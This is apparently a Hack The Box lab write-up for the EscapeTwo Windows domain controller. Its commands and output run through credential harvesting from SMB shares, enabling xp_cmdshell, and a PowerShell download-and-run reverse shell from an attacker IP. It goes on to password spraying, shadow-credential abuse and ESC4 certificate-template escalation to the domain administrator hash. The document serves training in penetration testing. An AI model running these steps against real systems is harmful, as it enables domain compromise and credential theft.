```
Oh my goodness there is a lot of ports open but lets dissect this. 

We have SMB (445), ldap (389, 636), Kerberos (88), WinRM (5985, 47001), and MS-SQL (1433). We can also see that there is a DC01 domain, DC01.sequel.htb domain, and also sequel.htb domain. which we will add in our /etc/hosts 

With the provided credentials we receive `rose / KxEPkKe6R8su` we can login to MSSQL. 
```
mssqlclient.py sequel.htb/rose:KxEPkKe6R8su@DC01 -windows-auth
```
a technique which we can do is run impacket-smbserver and then get hash to crack here is the method even though this didnt help us 
```
#On local 
touch file.txt
sudo impacket-smbserver -smb2support share $(pwd)

#In MSSQL session 
xp_dirtree \\10.10.16.75\file.txt
```
We will receive a hash but we cannot crack it. Moving on we have dump LDAP data and begin to enumerate the domain with bloodhound 
```
ldapdomaindump ldap://10.10.11.51 -u "sequel.htb\rose" -p 'KxEPkKe6R8su'
```
After that run
```
bloodhound-python -u rose -p KxEPkKe6R8su -ns 10.10.11.51 -d sequel.htb -c all --zip 
```
We can also try to get kerberoastable accounts though these hashes don't crack either 
```
nxc ldap dc01 -u 'rose' -p 'KxEPkKe6R8su' --kerberoast kerberos.hash
```
It's also worth checking ADCS existence as it opens many avenues to find misconfigurations associated with the templates 
```
nxc ldap 10.10.11.51 -u rose -p 'KxEPkKe6R8su' -M adcs
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
ADCS        10.10.11.51     389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.51     389    DC01             Found PKI Enrollment Server: DC01.sequel.htb
ADCS        10.10.11.51     389    DC01             Found CN: sequel-DC01-CA
```
I then began looking at SMB shares with my credentials and I found access to two shared folders 
```
nxc smb 10.10.11.51 -u "rose" -p 'KxEPkKe6R8su' --shares
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.11.51     445    DC01             Users           READ 
```
Accounting Department seems interesting so Im going to go check that out 
```
smbclient //10.10.11.51/Accounting\ Department -U rose%KxEPkKe6R8su
```

```
smbclient //10.10.11.51/Accounting\ Department -U rose%KxEPkKe6R8su
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 05:52:21 2024
  ..                                  D        0  Sun Jun  9 05:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 05:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 05:52:07 2024

		6367231 blocks of size 4096. 879350 blocks available
```
we get two account files 
we will get all and put them in a directory for organisation 
```
mget *
```
we will unzip these folders because xlsx can be treated as a zip file. Looking at the xl directory and then opening their SharedStrings.xml I saw multiple credentials
```
angela:0fwz7Q4mSpurIt99
oscar:86LxLBMgEWaKUnBG
kevin:Md9Wlq1E5bZnVDVo
sa:MSSQLP@ssw0rd!
```
# Lateral Movement
using the sa account I can login to MSSQL as admin 
```
mssqlclient.py sa:'MSSQLP@ssw0rd!'@10.10.11.51
```
MSSQL was being weird so I asked chatgpt and it gave me these commands to run which worked
```
USE master;

#Allow changing advanced settings 
EXEC sp_configure N'show advanced options', 1;
RECONFIGURE;

#Turn on xp_cmdshell
EXEC sp_configure N'xp_cmdshell', 1; 
RECONFIGURE;

EXEC master.dbo.xp_cmdshell N'whoami';

#this should return DOMAIN\sql_svc
```
If this you received the feedback of the whoami we can begin with a reverse shell of this user. 

To begin with this we can use a tool called PowerJoker which will provide a payload.ps1 which can then be used to get a reverse shell 
```
sudo git clone https://github.com/Adkali/PowerJoker
```
then begin your PowerJoker on your own IP and then a port you want to listen on 
```
python3 /path/to/PowerJoker -l <OWN_IP> -p <PORT_TO_LISTEN>
```
It will produce one which you can copy and paste but we are not going to use this, we will cancel by `[CTRL + C]` and then continue by downloading it into SQL and then executing it, which is done this way. Make sure you have a netcat listener on that port though 
```
EXEC master.dbo.xp_cmdshell  N'powershell -NoP -NonI -W Hidden -Command "iwr http://10.10.14.2/Payload.ps1 -UseBasicParsing -OutFile C:\ProgramData\rev.ps1"';

EXEC master.dbo.xp_cmdshell N'powershell -NoP -NonI -W Hidden -File C:\ProgramData\rev.ps1';
```
You should have now received a reverse shell, from here we can begin enumeration 
under the C:\ there is a SQL2019 folder, within the SQL2019 folder there is another folder ExpressAdv_ENU, in this folder we can see a sql-Configuration.INI. In this folder we can find more credentials 
```
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
```
With this password we can spray for users which have this same password, this is the username list which I used, I also said to chatgpt to give me 100 most common names 
```
angela 
oscar
james  
michael  
robert  
john  
david  
william  
richard  
joseph  
thomas  
christopher  
charles  
daniel  
matthew  
anthony  
mark  
donald  
steven  
andrew  
paul  
joshua  
kenneth  
kevin  
brian  
timothy  
ronald  
george  
jason  
edward  
jeffrey  
ryan  
jacob  
nicholas  
gary  
eric  
jonathan  
stephen  
larry  
justin  
scott  
brandon  
benjamin  
samuel  
gregory  
alexander  
patrick  
frank  
raymond  
jack  
dennis  
jerry  
mary  
patricia  
jennifer  
linda  
elizabeth  
barbara  
susan  
jessica  
karen  
sarah  
lisa  
nancy  
sandra  
betty  
ashley  
emily  
kimberly  
margaret  
donna  
michelle  
carol  
amanda  
melissa  
deborah  
stephanie  
rebecca  
sharon  
laura  
cynthia  
dorothy  
amy  
kathleen  
angela  
shirley  
emma  
brenda  
pamela  
nicole  
anna  
samantha  
katherine  
christine  
debra  
rachel  
carolyn  
janet  
maria  
olivia  
heather  
helen
sql_svc
sa
```
and we actually got a hit on ryan!
```
nxc ldap 10.10.11.51 -u users.list -p 'WqSZAF6CysDQbGb3' --continue-on-success

<SNIP>
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
<SNIP>
```
We will now logon to ryans computer 
```
evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
```
# Priv Esc 
We can now use powerview on our linux box to manually enumerate user's privileges 
```
sudo git clone https://github.com/aniqfakhrul/powerview.py /opt/powerview.py
```

```
sudo pip3 install -r requirements.txt
```

```
python3 /opt/powerview.py/powerview.py sequel.htb/ryan:'WqSZAF6CysDQbGb3'@10.10.11.51
```
We will initially get ryan SID 
```
Get-DomainUser -Identity ryan -Select ObjectSid 
S-1-5-21-548670397-972687484-3496335370-1114
```
We will now see what permissions this user has on the environment 
```
Get-DomainObjectAcl -ResolveGUIDs -SecurityIdentifier S-1-5-21-548670397-972687484-3496335370-1114

ObjectDN                    : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
ObjectSID                   : S-1-5-21-548670397-972687484-3496335370-1607
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : FullControl
AccessMask                  : FullControl
InheritanceType             : None
SecurityIdentifier          : SEQUEL\ryan

ObjectDN                    : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
ObjectSID                   : S-1-5-21-548670397-972687484-3496335370-1607
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE
ActiveDirectoryRights       : WriteOwner
AccessMask                  : WriteOwner
InheritanceType             : None
SecurityIdentifier          : SEQUEL\ryan
```
We can also see this through bloodhound
```
bloodhound -u ryan -p "WqSZAF6CysDQbGb3" -d sequel.htb -ns 10.10.11.51 -c All
```
![[ESCAPETWO RYANS PRIVS ON CA.png]]
ryan account has WriteOwner rights on the Certification Authority object, we can take over ca_svc account 

The ca_svc account is typically used by CA service. This service is reponsible for issuing and managing certifications for users, devices, and servers across the AD domain. Taking over this we can potentially manipulate certificate issuance. This at first took me awhile because it wasnt working, then after a sort of reset it started working. We can run these commands to do this 
```
Set-DomainObjectOwner -TargetIdentity ca_svc -PrincipalIdentity ryan
[2025-04-25 01:54:36] [Set-DomainObjectOwner] Changing current owner S-1-5-21-548670397-972687484-3496335370-512 to S-1-5-21-548670397-972687484-3496335370-1114
[2025-04-25 01:54:36] [Set-DomainObjectOwner] Success! modified owner for CN=Certification Authority,CN=Users,DC=sequel,DC=htb
(LDAPS)-[DC01.sequel.htb]-[SEQUEL\ryan]
<-TargetIdentity ca_svc -PrincipalIdentity ryan -Rights fullcontrol                             
[2025-04-25 01:55:09] [Add-DomainObjectACL] Found target identity: CN=Certification Authority,CN=Users,DC=sequel,DC=htb
[2025-04-25 01:55:09] [Add-DomainObjectACL] Found principal identity: CN=Ryan Howard,CN=Users,DC=sequel,DC=htb
[2025-04-25 01:55:09] Adding FullControl to S-1-5-21-548670397-972687484-3496335370-1607
[2025-04-25 01:55:09] DACL modified successfully!
(LDAPS)-[DC01.sequel.htb]-[SEQUEL\ryan]
```
We can now get ca_svc hash 
```
certipy shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '15369a67-f1e6-710d-852f-b4d42ca3b31e'
[*] Adding Key Credential with device ID '15369a67-f1e6-710d-852f-b4d42ca3b31e' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '15369a67-f1e6-710d-852f-b4d42ca3b31e' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```
We will now run this command to enumerate vulnerable CA templates and ADCS misconfigurations
```
certipy find -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable -dc-ip 10.10.11.51
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```
It’s means that the template “DunderMifflinAuthentication” is vulnerable to an ESC4 (Enterprise Security Certificate Bypass Technique 4) attack.

What is ESC4?

“ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.”

Modifies the template using the cached Kerberos ticket ca_svc.ccache.
```
KRB5CCNAME=$PWD/ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```
Requests certificate using the DunderMifflinAuthentication template.
```
certipy req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'sequel.htb' at '10.10.11.51'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with multiple identifications
    UPN: 'administrator@sequel.htb'
    DNS Host Name: '10.10.11.51'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_10.pfx'
```
We obtain TGT and extract NTLM hash 
```
certipy auth -pfx administrator_10.pfx  -domain sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@sequel.htb'
    [1] DNS Host Name: '10.10.11.51'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```
Now we can login and get root 
```
evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```
Further reading 
https://github.com/ly4k/Certipy?source=post_page-----23c893a454d4---------------------------------------

https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets?source=post_page-----23c893a454d4---------------------------------------

https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html?source=post_page-----23c893a454d4---------------------------------------#vulnerable-certificate-template-access-control---esc4




[[Practice (HTB)]]


